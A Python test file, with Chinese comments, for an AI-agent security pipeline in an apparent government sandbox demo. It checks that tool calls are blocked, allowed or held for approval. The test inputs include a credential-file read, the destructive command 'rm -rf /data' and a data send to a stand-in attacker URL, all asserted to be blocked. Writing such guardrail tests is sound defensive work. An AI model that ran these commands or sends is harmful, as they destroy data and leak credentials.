"""政务沙盘运行时:gov 业务工具经 SecurityPipeline 统一评估(去分叉后的回归网)。

只测红队直连 gate_direct(不经模型、确定性):证明 demo 真实跑的就是管线评估链
(evaluate_intent),fail-closed / 审计 / 策略与内核单一真源,而非各自手撸。
"""

from __future__ import annotations

import asyncio
from typing import Any

from fulcrum.core.domain import Disposition
from fulcrum.demo.runtime import GovRuntime


def _gate(rt: GovRuntime, session: str, fn: str, args: dict) -> dict[str, Any]:
    return asyncio.run(rt.gate_direct(session, fn, args))


def test_confidential_doc_read_blocked() -> None:
    res = _gate(GovRuntime(), "t1", "doc_read", {"path": "confidential/admin_creds.txt"})
    step = res["steps"][1]
    assert step["decision"] == Disposition.BLOCK
    assert step["executed"] is False
    assert res["chain_ok"] is True


def test_benign_kb_search_allowed_and_executed() -> None:
    res = _gate(GovRuntime(), "t2", "kb_search", {"query": "低保"})
    step = res["steps"][1]
    assert step["decision"] == Disposition.ALLOW
    assert step["executed"] is True
    assert res["chain_ok"] is True


def test_dangerous_command_blocked() -> None:
    res = _gate(GovRuntime(), "t3", "shell_exec", {"command": "rm -rf /data"})
    assert res["steps"][1]["decision"] == Disposition.BLOCK


def test_funds_disburse_requires_approval() -> None:
    res = _gate(GovRuntime(), "t4", "funds_disburse", {"payee": "张三", "amount": 5000})
    step = res["steps"][1]
    assert step["decision"] == Disposition.APPROVE
    assert step["executed"] is False


def test_external_send_nonwhitelist_blocked() -> None:
    res = _gate(
        GovRuntime(), "t5", "external_send", {"url": "http://attacker.example/x", "content": "x"}
    )
    assert res["steps"][1]["decision"] == Disposition.BLOCK


def test_gov_tools_registered_and_carry_base_risk() -> None:
    """gov 工具是真 Tool(带 base_risk),不再走 gov.execute 字典派发绕过端口。"""
    from fulcrum.core.registry import registry

    GovRuntime()  # 触发注册
    for name in ("doc.read", "kb.search", "funds.disburse", "shell.exec"):
        tool = registry.create("tool", name)
        assert 0.0 <= tool.base_risk <= 1.0
        assert tool.name == name
